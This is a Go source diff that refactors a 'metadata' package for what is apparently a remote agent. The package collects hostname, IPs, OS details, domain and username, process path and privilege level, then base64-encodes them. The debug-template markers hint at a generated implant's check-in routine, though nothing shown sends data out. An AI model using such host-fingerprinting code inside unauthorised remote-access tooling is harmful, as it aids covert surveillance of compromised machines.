@@ -1,12 +1,9 @@
 package metadata
 
 import (
+	"agent/internal/logger"
 	"encoding/base64"
 	"encoding/json"
-
-	// {{if .Debug}}
-	"log"
-	// {{end}}
 	"net"
 	"os"
 	"os/user"
@@ -24,41 +21,37 @@ type Metadata struct {
 	Extra    string   `json:"e,omitempty"`
 }
 
-func GetMetadata() (string, error) {
+func GetMetadata() string {
+	lg := logger.GetLogger()
+	lg.Info("Collecting metadata")
+
 	metadata := &Metadata{
 		Hostname: getHostname(),
-		OSMeta:   getOSMeta(),
 		IPs:      getIPs(),
+		OSMeta:   getOSMeta(),
 		ProcName: getProcName(),
 		IsPriv:   isPrivileged(),
+		Extra:    "TODO",
 	}
 	metadata.Domain, metadata.Username = getUsername()
 
-	encoded, err := encodeMetadata(metadata)
-	if err != nil {
-		return "", err
+	lg.Info("Hostname: %s", metadata.Hostname)
+	if metadata.Domain != "" {
+		lg.Info("Domain: %s", metadata.Domain)
 	}
+	lg.Info("Username: %s", metadata.Username)
+	lg.Info("OS: %s", metadata.OSMeta)
+	lg.Info("Process name: %s", metadata.ProcName)
+	lg.Info("Is priveleged: %t", metadata.IsPriv)
+	lg.Info("Extra: %s", metadata.Extra)
 
-	// {{if .Debug}}
-	log.Printf("Username: %s", metadata.Username)
-	log.Printf("Hostname: %s", metadata.Hostname)
-	log.Printf("Domain: %s", metadata.Domain)
-	log.Printf("OSMeta: %s", metadata.OSMeta)
-	log.Printf("IPs: %v", metadata.IPs)
-	log.Printf("ProcName: %s", metadata.ProcName)
-	log.Printf("IsPriv: %t", metadata.IsPriv)
-	log.Printf("Encoded metadata: %s", encoded)
-	// {{end}}
-	return encoded, nil
-}
-
-func encodeMetadata(metadata *Metadata) (string, error) {
-	json, err := json.Marshal(metadata)
+	jsonMeta, err := json.Marshal(metadata)
 	if err != nil {
-		return "", err
+		lg.Fatal("Failed to convert metadata to JSON: %w", err)
 	}
+	encodedMetadata := base64.RawURLEncoding.EncodeToString(jsonMeta)
 
-	return base64.RawStdEncoding.EncodeToString(json), nil
+	return encodedMetadata
 }
 
 func getUsername() (domain string, username string) {
@@ -86,6 +79,14 @@ func getHostname() string {
 	return hostname
 }
 
+func getProcName() string {
+	proc, err := os.Executable()
+	if err != nil {
+		return "<unknown>"
+	}
+	return proc
+}
+
 func getIPs() []string {
 	interfaces, err := net.InterfaceAddrs()
 	if err != nil {
@@ -102,12 +103,4 @@ func getIPs() []string {
 	}
 
 	return ips
-}
-
-func getProcName() string {
-	proc, err := os.Executable()
-	if err != nil {
-		return "<unknown>"
-	}
-	return proc
 }
